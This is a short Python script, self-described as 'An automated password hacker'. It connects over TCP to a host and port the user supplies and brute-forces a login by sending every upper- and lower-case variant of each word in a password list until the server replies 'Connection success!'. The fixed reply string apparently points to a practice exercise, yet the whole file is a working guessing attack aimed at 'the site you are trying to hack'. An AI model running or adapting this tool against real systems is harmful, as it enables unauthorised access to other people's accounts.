import argparse
import itertools
import socket


pass_hacker = argparse.ArgumentParser(description='An automated password hacker')
pass_hacker.add_argument("hostname", type=str, help='the IP address or domain name of the site you are trying to hack')
pass_hacker.add_argument("port", type=int, help='the port number of the site you are trying to hack')
args = pass_hacker.parse_args()

hacker = socket.socket()
address = (args.hostname, args.port)

with hacker as h:
    h.connect(address)
    with open('passwords.txt') as f:
        for line in f:
            password = line.strip()
            temp = map(''.join, itertools.product(*((char.upper(), char.lower()) if char.isalpha()
                                                    else char for char in password)))
            for item in temp:
                h.send(item.encode())
                rec_data = h.recv(1024)
                if rec_data == b'Connection success!':
                    print(item)
                    break
            if rec_data == b'Connection success!':
                break
